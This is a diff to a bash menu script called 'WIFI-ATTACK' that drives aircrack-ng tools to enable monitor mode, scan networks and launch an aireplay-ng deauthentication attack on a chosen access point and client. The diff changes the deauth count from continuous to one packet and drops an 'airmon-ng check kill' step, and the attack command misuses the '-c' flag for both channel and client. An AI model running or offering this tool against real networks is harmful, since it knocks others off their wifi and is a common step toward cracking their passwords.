@@ -11,14 +11,13 @@ clear
 #meni de Opcines 
 figlet WIFI-ATTACK
 echo "[1] Start Modo monitor"
-echo "[2] Stop Modo monitor"+
+echo "[2] Stop Modo monitor"
 echo "[3] Scan Wifi"
 echo "[4] Attack Wifi"
 echo "[5] Exit"
 read -p "Options :" Opcines_menu
 #Opcines del menu 
 if [ $Opcines_menu = 1 ]; then
-sudo airmon-ng check kill
 clear
 iwconfig
 read -p "Select your network card :" tarjeta_red
@@ -55,7 +54,7 @@ read -p "CHANNEL OF TARGET: " channel
 read -p "ACCES POINT TARGET MAC: " mac_ap
 read -p "CLIENT TARGET MAC: " mac_cliente
 read -p "SELECT YOUR NETWORK CARD" card_tj
-aireplay-ng --deauth 0 -c $channel -a $mac_ap -c $mac_cliente $card_tj
+aireplay-ng --deauth 1 -c $channel -a $mac_ap -c $mac_cliente $card_tj
 bash wifi_auto.sh
 elif [ $Opcines_menu = 5 ]; then
 exit 0
